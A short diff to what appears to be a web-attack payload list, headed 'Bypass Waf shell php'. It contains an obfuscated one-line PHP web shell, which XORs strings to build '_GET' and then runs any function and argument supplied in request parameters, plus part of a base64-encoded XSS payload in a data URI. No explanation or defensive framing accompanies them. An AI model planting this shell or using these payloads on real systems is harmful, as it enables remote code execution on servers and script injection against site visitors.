@@ -66,5 +66,5 @@ data%3Atext%2Fhtml%3Bbase64%2CPGltZyBzcmM9eCBvbmVycm9yPWphdmFzY3JpcHQ6cHJvbXB0KG
 
 <h1>Bypass Waf shell php </h1>
 </br>
-<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);
+[++++++]<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);[++++++]
 </br>
